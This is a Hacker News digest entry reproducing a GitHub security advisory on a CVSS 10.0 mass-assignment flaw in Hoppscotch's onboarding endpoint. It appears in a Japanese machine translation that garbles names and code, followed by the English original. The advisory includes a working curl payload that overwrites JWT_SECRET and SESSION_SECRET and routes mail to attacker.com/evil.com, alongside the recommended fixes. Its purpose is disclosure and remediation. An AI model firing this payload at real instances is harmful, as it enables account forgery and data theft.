---
source: "https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-j542-4rch-8hwf"
hn_url: "https://news.ycombinator.com/item?id=48648267"
title: "Autonomous AI Agent Finds CVSS 10.0 Full Compromise in Hoppscotch"
article_title: "Mass Assignment via Onboarding Endpoint Allows Unauthenticated JWT_SECRET Overwrite · Advisory · hoppscotch/hoppscotch · GitHub"
author: "infy"
captured_at: "2026-06-23T17:34:26Z"
capture_tool: "hn-digest"
hn_id: 48648267
score: 1
comments: 0
posted_at: "2026-06-23T17:24:01Z"
tags:
  - hacker-news
  - translated
---

# Autonomous AI Agent Finds CVSS 10.0 Full Compromise in Hoppscotch

- HN: [48648267](https://news.ycombinator.com/item?id=48648267)
- Source: [github.com](https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-j542-4rch-8hwf)
- Score: 1
- Comments: 0
- Posted: 2026-06-23T17:24:01Z

## Translation

タイトル: 自律型 AI エージェントが石けり遊びで CVSS 10.0 の完全な侵害を発見
記事のタイトル: オンボーディング エンドポイントを介した一括割り当てにより、認証されていない JWT_SECRET の上書きが許可される · アドバイザリー · 石けり遊び/石けり遊び · GitHub
説明: GitHub は人々がソフトウェアを構築する場所です。 1 億 5,000 万人以上の人々が GitHub を使用して、4 億 2,000 万以上のプロジェクトを発見、フォーク、貢献しています。

記事本文:
オンボーディング エンドポイント経由の一括割り当てにより、認証されていない JWT_SECRET の上書きが許可される · アドバイザリー · 石けり遊び/石けり遊び · GitHub
コンテンツにスキップ
ナビゲーションメニュー
サインイン
外観設定
プラットフォーム AI コード作成 GitHub Copilot AI を使用してより良いコードを作成する
GitHub Copilot アプリ エージェントが発行からマージまで直接担当
MCP レジストリ 新しい外部ツールの統合
開発者のワークフロー アクション あらゆるワークフローを自動化します
コードスペース インスタント開発環境
コードレビュー コードの変更を管理する
アプリケーションセキュリティ GitHub Advanced Security 脆弱性を見つけて修正する
コードのセキュリティ 構築時にコードを保護する
機密保護 漏洩が始まる前に阻止
企業規模別のソリューション
タイプごとに詳しく見る お客様の事例
サポートとサービスのドキュメント
オープンソース コミュニティ GitHub スポンサー オープンソース開発者に資金を提供する
エンタープライズ エンタープライズ ソリューション エンタープライズ プラットフォーム AI を活用した開発者プラットフォーム
利用可能なアドオン GitHub Advanced Security エンタープライズ グレードのセキュリティ機能
Copilot for Business エンタープライズ グレードの AI 機能
プレミアム サポート エンタープライズ レベルの 24 時間年中無休のサポート
検索またはジャンプ...
コード、リポジトリ、ユーザー、問題、プル リクエストを検索します...
クリア
検索構文のヒント
フィードバックを提供する
-->
私たちはフィードバックをすべて読み、ご意見を真摯に受け止めます。
保存された検索を使用して結果をより迅速にフィルタリングします
-->
名前
クエリ
利用可能なすべての修飾子を確認するには、ドキュメントを参照してください。
外観設定
フォーカスをリセットする
別のタブまたはウィンドウでサインインしました。リロードしてセッションを更新します。
別のタブまたはウィンドウでサインアウトしました。リロードしてセッションを更新します。
別のタブまたはウィンドウでアカウントを切り替えました。リロードしてセッションを更新します。
アラートを閉じる
{{ メッセージ }}
石けり遊び
/
石けり遊び
公共
ああ、ああ！
読み込み中にエラーが発生しました。このページをリロードしてください。
通知

s
通知設定を変更するにはサインインする必要があります
追加のナビゲーション オプション
コード
オンボーディング エンドポイント経由の一括割り当てにより、認証されていない JWT_SECRET の上書きが可能になる
POST /v1/onboarding/config エンドポイントを使用すると、認証されていない攻撃者が一括割り当てを通じて任意の InfraConfig キー (JWT_SECRET や SESSION_SECRET を含む) をデータベースに挿入することができます。これらのキーは SaveOnboardingConfigRequest DTO では宣言されていませんが、NestJS ValidationPipe は余分なプロパティを削除しないため、サービス層に渡され、そこで Object.entries(dto) が制限なくすべてのキーを反復処理します。
これにより、サーバーが完全に侵害されます。攻撃者は JWT 署名キーを制御し、管理者を含む任意のユーザーのトークンを偽造できます。
この攻撃は、オンボーディングが完了する前 (または usersCount === 0 の場合) の新規インストールに対してのみ機能します。ただし、自己ホスト型 Hoppscotch インスタンスは初期セットアップ中にインターネットに公開されるため、デプロイメントとオンボーディング完了の間の時間帯がまさにインスタンスが最も脆弱になる瞬間です。
新しい Hoppscotch AIO Docker デプロイメントでのライブの概念実証で確認されました。
package/hoppscotch-backend/src/main.ts (行 93 ～ 97) -- ValidationPipe 構成
package/hoppscotch-backend/src/infra-config/infra-config.service.ts (行 538 ～ 553) -- 制約のないキーの反復
package/hoppscotch-backend/src/infra-config/infra-config.service.ts (行 806) -- validateEnvValues スイッチ (デフォルト: Break)
package/hoppscotch-backend/src/infra-config/onboarding.controller.ts (行 58) -- 認証されていないエンドポイント
package/hoppscotch-backend/src/types/InfraConfig.ts (行 5 ～ 6) -- 有効な InfraConfigEnum 値としての JWT_SECRET および SESSION_SECRET
4 つの独立した弱点が組み合わされて、この攻撃が可能になります。
弱点 1 -- ValidationPipe のミス

g ホワイトリスト: true (main.ts:93--97)
アプリ。 useGlobalPipes (
新しい ValidationPipe ( {
変換: true 、
// ホワイトリスト: true -- 欠落: 余分なプロパティは削除されません
} )、
) ;
Whitelist: true を指定しない場合、NestJS は、SaveOnboardingConfigRequest クラスで宣言されていないプロパティを含む、すべてのプロパティをリクエスト本文から DTO オブジェクトにコピーします。 JWT_SECRET 、 SESSION_SECRET 、およびその他のセキュリティ上重要なキーは DTO フィールドではありません。これらは削除されるべき追加のプロパティですが、削除されていません。
この攻撃を防ぐには弱点 1 だけで十分です。弱点 2 ～ 4 も多層防御として対処する必要があります。
弱点 2 -- 制約のない Object.entries(dto) (infra-config.service.ts:538--543)
const configEntries : InfraConfigArgs [ ] = [
... オブジェクト 。エントリ ( dto )
。フィルタ ( ( [ _ , 値 ] ) => 値 !== 未定義 )
。 map ( ( [ キー , 値 ] ) => ( {
name : key as InfraConfigEnum , // TypeScript キャスト、ランタイム検証なし
値 、
} ) )、
] ;
InfraConfigEnum としてキャスト キーは実行時チェックを実行しません。 Object.entries(dto) は、弱点 1 から漏洩した追加のプロパティを含む、DTO オブジェクトのすべてのプロパティを反復します。 JWT_SECRET は有効な InfraConfigEnum 値 (types/InfraConfig.ts:5 で定義) であるため、攻撃者が指定したキーは正当な構成エントリとして扱われ、データベースに書き込まれます。
弱点 3 -- validateEnvValues のデフォルト:break (infra-config.service.ts:806)
validateEnvValues メソッドは、InfraConfigEnum 値に対して switch ステートメントを使用して、受信した構成エントリを検証します。デフォルトのケースは次のとおりです。
デフォルト:
休憩; // 認識されないキーは静かに検証を通過します
このスイッチでは、JWT_SECRET および SESSION_SECRET には明示的な検証ケースがありません。これらはデフォルトに陥り、検証を中断してサイレントに通過し、データベースへの書き込みを続行できるようになります。
ウィーア

kness 4 -- 認証なしでパブリックにアクセスできるエンドポイント
@ コントローラー ( { パス : 'onboarding' 、バージョン : '1' } )
@ UseGuards ( ThrottlerBehindProxyGuard ) // レート制限のみ、認証なし
エクスポート クラス OnboardingController { ... }
エンドポイントには認証ガードがありません。オンボーディングが完了していない限り (実行時にチェックされ、 usersCount === 0 でゲートされます)、認証されていないリクエストにアクセスできます。
JWT_SECRET 、 SESSION_SECRET 、およびその他のセキュリティ クリティカルなキーは、SaveOnboardingConfigRequest DTO のフィールドではありません。 DTO は、予期されるオンボーディング フィールド (OAuth プロバイダー、SMTP 設定など) のみを宣言します。このエクスプロイトが機能するのは、DTO にない余分なキーが削除されず (弱点 1)、制限なしで反復され (弱点 2)、サイレントに検証を通過し (弱点 3)、未認証のエンドポイントに到達する (弱点 4) ためです。
この攻撃は、次の条件のいずれかが当てはまる場合に機能します。
新規インストール: オンボーディングがまだ完了していません
usersCount === 0 (データベースにユーザーが存在しません)
自己ホスト型 Hoppscotch インスタンスは通常、初期セットアップ中にインターネットに公開されます。デプロイメントからオンボーディング完了までの時間枠は、インスタンスが最も脆弱になる正確な期間です。オンボーディング エンドポイントは、攻撃者が新しく発見された Hoppscotch インスタンスで最初に調査するものです。
ステップ 1 -- オンボーディング ステータスを確認します (未認証):
カール http://target:3170/v1/onboarding/status
# {"onboardingCompleted":false,"canReRunOnboarding":true}
ステップ 2 -- DTO にない追加のキーを含む一括割り当てペイロードを送信します。
カール -X POST http://target:3170/v1/onboarding/config \
-H " Content-Type: application/json " \
-d ' {
"VITE_ALLOWED_AUTH_PROVIDERS": "電子メール",
"MAILER_SMTP_ENABLE": "true",
"MAILER_SMTP_URL": "smtp://攻撃者.com:25",
"MAILER_ADDRESS_FROM": "攻撃者

@evil.com」、
"JWT_SECRET": "ATTACKER_CONTROLLED_JWT_SECRET",
"SESSION_SECRET": "ATTACKER_CONTROLLED_SESSION"
} '
# {"トークン":"5d63f43c-aeda-473f-bb84-abfdd739a8a5"} -- 成功
注: VITE_ALLOWED_AUTH_PROVIDERS 、 MAILER_SMTP_ENABLE 、 MAILER_SMTP_URL 、および MAILER_ADDRESS_FROM は、プロバイダー検証チェックに合格するために必要な正当な DTO フィールドです。 JWT_SECRET と SESSION_SECRET は DTO フィールドではなく、追加のプロパティが挿入されます。
ステップ 3 -- JWT_SECRET が上書きされたことを確認します。
psql -c " SELECT 名前、値 FROM InfraConfig WHERE name = 'JWT_SECRET'; 」
# 復号化先: ATTACKER_CONTROLLED_JWT_SECRET
テスト対象: Hoppscotch AIO Docker イメージ ( hoppscotch-hoppscotch-aio:latest )、新規デプロイメント。
攻撃前 -- DB 内の JWT_SECRET (AES-256-CBC 暗号化):
5c3ddd04363604faeb24a09a...:acf5090650be46309af5633d...
攻撃後 -- DB 内の JWT_SECRET (復号化):
ATTACKER_CONTROLLED_JWT_SECRET
攻撃後 -- DB 内の SESSION_SECRET (復号化):
ATTACKER_CONTROLLED_SESSION
影響
JWT 署名キーの引き継ぎによるサーバー全体の侵害。
攻撃者が JWT_SECRET を制御すると、次のようになります。
任意の JWT トークンを偽造 -- 資格情報を知らなくても、管理者アカウントを含む任意のユーザー UID の JWT に署名します
任意のユーザーになりすます -- 偽造トークンは、攻撃者が管理するシークレットと照合して検証されるため、すべての JwtAuthGuard チェックに合格します。
管理者アクセスを維持する -- 正規の管理者が資格情報をリセットした後でも、デプロイメントが完全に破棄されるまで、攻撃者は署名キーの管理を保持します。
すべてのユーザー データを抽出します -- 認証された GraphQL クエリにより、すべてのワークスペース、コレクション、API キー、およびチーム データが取得されます
セッション ハイジャック -- SESSION_SECRET を上書きすると、既存のセッションがすべて無効になり、攻撃者が新しいセッションを偽造できるようになります。
同じベクトルを介して追加のキーを注入可能 (すべて DTO にはありませんが、有効な InfraConfi です)

gEnum 値):
ベクトル: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
基本スコア: 10.0 (クリティカル)
4 つの独立した修正が必要です。 Fix 1 だけでこの特定の攻撃をブロックします。修正 2 ～ 4 は多層防御を提供します。
修正 1 -- ValidationPipe (main.ts) でホワイトリストを有効にします: true:
アプリ。 useGlobalPipes (
新しい ValidationPipe ( {
変換: true 、
Whitelist : true , // DTO で宣言されていないプロパティを削除します
forbidNonWhitelisted : true , // 追加のプロパティの場合は 400 を返します
} )、
) ;
修正 2 -- updateOnboardingConfig (infra-config.service.ts) で許可されたキーを検証します。
const ONBOARDING_ALLOWED_KEYS = 新しいセット ( [
InfraConfigEnum 。 VITE_ALLOWED_AUTH_PROVIDERS 、
InfraConfigEnum 。 GOOGLE_CLIENT_ID 、
InfraConfigEnum 。 GOOGLE_CLIENT_SECRET 、
// ... OAuth フィールドと SMTP フィールドのみ -- JWT_SECRET、SESSION_SECRET などは使用しません。
]);
const configEntries = オブジェクト 。エントリ ( dto )
。 filter ( ( [ key , value ] ) => value !== 未定義 && ONBOARDING_ALLOWED_KEYS . has ( key as InfraConfigEnum ) )
。 map (([キー, 値]) => ({名前: InfraConfigEnum としてのキー, 値})) ;
修正 3 -- セキュリティ クリティカルなキーの validateEnvValues に明示的な拒否を追加します。
// デフォルトの Break の代わりに、オンボーディングで設定すべきではないキーを明示的に拒否します
InfraConfigEnum の場合。 JWT_SECRET :
InfraConfigEnum の場合。 SESSION_SECRET :
throw new Error (` ${ key } はオンボーディング エンドポイント経由では設定できません` ) ;
解決策 4 -- オンボーディング エンドポイントで認証またはワンタイム セットアップ トークンを要求します。
GitLab、Grafana、その他の自己ホスト型ツールで使用されるパターンと同様に、最初の起動時に生成されるワンタイム セットアップ トークンを使用してエンドポイントを保護します。
CWE-915: 動的に決定されたオブジェクト属性の不適切な制御による変更
NestJS ValidationPipe ホワイトリスト オプション
このスコアは、全体的な脆弱性の重大度を 0 から 1 まで計算します。

0 であり、Common Vulnerability Scoring System (CVSS) に基づいています。
/10
CVSS v3 基本メトリクス
攻撃ベクトル
ネットワーク
攻撃の複雑さ
低い
必要な権限
なし
ユーザーインタラクション
なし
範囲
変更されました
機密保持
高
誠実さ
高
可用性
なし
基本指標について詳しく見る
CVSS v3 基本メトリクス
攻撃ベクトル:
深刻度が高くなるほど、攻撃者は (論理的および物理的に) 遠隔地から脆弱性を悪用する可能性が高くなります。
攻撃の複雑さ:
最も単純な攻撃の場合はより深刻です。
必要な権限:
特権が必要ない場合はさらに厳しくなります。
ユーザーインタラクション:
ユーザーの操作が必要ない場合は、さらに深刻になります。
範囲:
スコープの変更が発生すると、より深刻になります。 1 つの脆弱なコンポーネントは、セキュリティの範囲を超えてコンポーネント内のリソースに影響を与えます。
機密保持:
データの機密性の損失が最も高い場合はより深刻で、権限のないユーザーが利用できるデータ アクセスのレベルが測定されます。
誠実さ:
データ整合性の損失が最も高い場合はより深刻で、権限のないユーザーによるデータ変更の可能性を測定します。
可用性:
影響を受けるコンポーネントの可用性の損失が最も大きくなると、より深刻になります。
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
CVE ID
不適切な管理

[切り捨てられた]

## Original Extract

GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.

Mass Assignment via Onboarding Endpoint Allows Unauthenticated JWT_SECRET Overwrite · Advisory · hoppscotch/hoppscotch · GitHub
Skip to content
Navigation Menu
Sign in
Appearance settings
Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry New Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search or jump to...
Search code, repositories, users, issues, pull requests...
Clear
Search syntax tips
Provide feedback
-->
We read every piece of feedback, and take your input very seriously.
Use saved searches to filter your results more quickly
-->
Name
Query
To see all available qualifiers, see our documentation .
Appearance settings
Resetting focus
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
hoppscotch
/
hoppscotch
Public
Uh oh!
There was an error while loading. Please reload this page .
Notifications
You must be signed in to change notification settings
Additional navigation options
Code
Mass Assignment via Onboarding Endpoint Allows Unauthenticated JWT_SECRET Overwrite
The POST /v1/onboarding/config endpoint allows an unauthenticated attacker to inject arbitrary InfraConfig keys -- including JWT_SECRET and SESSION_SECRET -- into the database via mass assignment. These keys are not declared in the SaveOnboardingConfigRequest DTO , but because the NestJS ValidationPipe does not strip extra properties, they pass through to the service layer where Object.entries(dto) iterates all keys without restriction.
This results in full server compromise: the attacker controls the JWT signing key and can forge tokens for any user including admin.
The attack works only on fresh installs before onboarding completes (or when usersCount === 0 ). However, self-hosted Hoppscotch instances are exposed to the internet during initial setup, and the window between deployment and onboarding completion is the exact moment the instance is most vulnerable.
Confirmed with a live proof-of-concept on a fresh Hoppscotch AIO Docker deployment.
packages/hoppscotch-backend/src/main.ts (lines 93--97) -- ValidationPipe configuration
packages/hoppscotch-backend/src/infra-config/infra-config.service.ts (lines 538--553) -- unconstrained key iteration
packages/hoppscotch-backend/src/infra-config/infra-config.service.ts (line 806) -- validateEnvValues switch with default: break
packages/hoppscotch-backend/src/infra-config/onboarding.controller.ts (line 58) -- unauthenticated endpoint
packages/hoppscotch-backend/src/types/InfraConfig.ts (lines 5--6) -- JWT_SECRET and SESSION_SECRET as valid InfraConfigEnum values
Four independent weaknesses combine to enable this attack:
Weakness 1 -- ValidationPipe missing whitelist: true (main.ts:93--97)
app . useGlobalPipes (
new ValidationPipe ( {
transform : true ,
// whitelist: true -- MISSING: extra properties are NOT stripped
} ) ,
) ;
Without whitelist: true , NestJS copies all properties from the request body to the DTO object, including properties not declared in the SaveOnboardingConfigRequest class. JWT_SECRET , SESSION_SECRET , and other security-critical keys are not DTO fields -- they are extra properties that should be stripped but are not.
Weakness 1 alone is sufficient to block this attack. Weaknesses 2--4 should also be addressed as defense in depth.
Weakness 2 -- Unconstrained Object.entries(dto) (infra-config.service.ts:538--543)
const configEntries : InfraConfigArgs [ ] = [
... Object . entries ( dto )
. filter ( ( [ _ , value ] ) => value !== undefined )
. map ( ( [ key , value ] ) => ( {
name : key as InfraConfigEnum , // TypeScript cast, no runtime validation
value ,
} ) ) ,
] ;
The cast key as InfraConfigEnum performs no runtime check. Object.entries(dto) iterates every property on the DTO object, including the extra properties that leaked through from Weakness 1. Since JWT_SECRET is a valid InfraConfigEnum value (defined in types/InfraConfig.ts:5 ), the attacker-supplied key is treated as a legitimate config entry and written to the database.
Weakness 3 -- validateEnvValues has default: break (infra-config.service.ts:806)
The validateEnvValues method uses a switch statement over InfraConfigEnum values to validate incoming config entries. The default case is:
default:
break ; // unrecognized keys silently pass validation
JWT_SECRET and SESSION_SECRET do not have explicit validation cases in this switch. They fall through to default: break and pass validation silently, allowing the database write to proceed.
Weakness 4 -- Endpoint publicly accessible without authentication
@ Controller ( { path : 'onboarding' , version : '1' } )
@ UseGuards ( ThrottlerBehindProxyGuard ) // rate-limit only, no auth
export class OnboardingController { ... }
The endpoint has no auth guard. It is accessible to any unauthenticated request as long as onboarding has not been completed (checked at runtime, gated on usersCount === 0 ).
JWT_SECRET , SESSION_SECRET , and other security-critical keys are NOT fields in the SaveOnboardingConfigRequest DTO. The DTO declares only the expected onboarding fields (OAuth providers, SMTP settings, etc.). The exploit works because extra keys not in the DTO are not stripped (Weakness 1), are iterated without restriction (Weakness 2), pass validation silently (Weakness 3), and reach an unauthenticated endpoint (Weakness 4).
The attack works when any of these conditions is true:
Fresh install: onboarding has not been completed yet
usersCount === 0 (no users exist in the database)
Self-hosted Hoppscotch instances are typically exposed to the internet during initial setup. The window between deployment and onboarding completion is the exact period when the instance is most vulnerable -- and the onboarding endpoint is the first thing an attacker would probe on a newly discovered Hoppscotch instance.
Step 1 -- Check onboarding status (unauthenticated):
curl http://target:3170/v1/onboarding/status
# {"onboardingCompleted":false,"canReRunOnboarding":true}
Step 2 -- Send the mass assignment payload with extra keys not in the DTO:
curl -X POST http://target:3170/v1/onboarding/config \
-H " Content-Type: application/json " \
-d ' {
"VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
"MAILER_SMTP_ENABLE": "true",
"MAILER_SMTP_URL": "smtp://attacker.com:25",
"MAILER_ADDRESS_FROM": "attacker@evil.com",
"JWT_SECRET": "ATTACKER_CONTROLLED_JWT_SECRET",
"SESSION_SECRET": "ATTACKER_CONTROLLED_SESSION"
} '
# {"token":"5d63f43c-aeda-473f-bb84-abfdd739a8a5"} -- SUCCESS
Note: VITE_ALLOWED_AUTH_PROVIDERS , MAILER_SMTP_ENABLE , MAILER_SMTP_URL , and MAILER_ADDRESS_FROM are legitimate DTO fields needed to pass the provider validation check. JWT_SECRET and SESSION_SECRET are not DTO fields -- they are injected extra properties.
Step 3 -- Verify JWT_SECRET was overwritten:
psql -c " SELECT name, value FROM InfraConfig WHERE name = 'JWT_SECRET'; "
# Decrypts to: ATTACKER_CONTROLLED_JWT_SECRET
Tested on: Hoppscotch AIO Docker image ( hoppscotch-hoppscotch-aio:latest ), fresh deployment.
Before attack -- JWT_SECRET in DB (AES-256-CBC encrypted):
5c3ddd04363604faeb24a09a...:acf5090650be46309af5633d...
After attack -- JWT_SECRET in DB (decrypted):
ATTACKER_CONTROLLED_JWT_SECRET
After attack -- SESSION_SECRET in DB (decrypted):
ATTACKER_CONTROLLED_SESSION
Impact
Full server compromise via JWT signing key takeover.
Once the attacker controls JWT_SECRET :
Forge arbitrary JWT tokens -- sign JWTs for any user UID including admin accounts without knowing any credentials
Impersonate any user -- forged tokens pass all JwtAuthGuard checks since they validate against the attacker-controlled secret
Persist admin access -- even after the legitimate admin resets credentials, the attacker retains signing key control until the deployment is fully torn down
Exfiltrate all user data -- authenticated GraphQL queries retrieve all workspaces, collections, API keys, and team data
Session hijacking -- overwriting SESSION_SECRET invalidates all existing sessions and allows the attacker to forge new ones
Additional keys injectable via the same vector (all are NOT in the DTO but are valid InfraConfigEnum values):
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Base Score: 10.0 (Critical)
Four independent fixes are needed. Fix 1 alone blocks this specific attack. Fixes 2--4 provide defense in depth.
Fix 1 -- Enable whitelist: true on ValidationPipe (main.ts):
app . useGlobalPipes (
new ValidationPipe ( {
transform : true ,
whitelist : true , // Strip properties not declared in DTO
forbidNonWhitelisted : true , // Return 400 for extra properties
} ) ,
) ;
Fix 2 -- Validate allowed keys in updateOnboardingConfig (infra-config.service.ts):
const ONBOARDING_ALLOWED_KEYS = new Set ( [
InfraConfigEnum . VITE_ALLOWED_AUTH_PROVIDERS ,
InfraConfigEnum . GOOGLE_CLIENT_ID ,
InfraConfigEnum . GOOGLE_CLIENT_SECRET ,
// ... OAuth and SMTP fields only -- never JWT_SECRET, SESSION_SECRET, etc.
] ) ;
const configEntries = Object . entries ( dto )
. filter ( ( [ key , value ] ) => value !== undefined && ONBOARDING_ALLOWED_KEYS . has ( key as InfraConfigEnum ) )
. map ( ( [ key , value ] ) => ( { name : key as InfraConfigEnum , value } ) ) ;
Fix 3 -- Add explicit rejection in validateEnvValues for security-critical keys:
// Instead of default: break, explicitly reject keys that should never be set via onboarding
case InfraConfigEnum . JWT_SECRET :
case InfraConfigEnum . SESSION_SECRET :
throw new Error ( ` ${ key } cannot be set via the onboarding endpoint` ) ;
Fix 4 -- Require authentication or a one-time setup token on the onboarding endpoint:
Protect the endpoint with a one-time setup token generated at first boot, similar to patterns used by GitLab, Grafana, and other self-hosted tools.
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
NestJS ValidationPipe whitelist option
This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).
/ 10
CVSS v3 base metrics
Attack vector
Network
Attack complexity
Low
Privileges required
None
User interaction
None
Scope
Changed
Confidentiality
High
Integrity
High
Availability
None
Learn more about base metrics
CVSS v3 base metrics
Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.
Attack complexity:
More severe for the least complex attacks.
Privileges required:
More severe if no privileges are required.
User interaction:
More severe when no user interaction is required.
Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.
Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.
Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.
Availability:
More severe when the loss of impacted component availability is highest.
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
CVE ID
Improperly Controlled

[truncated]
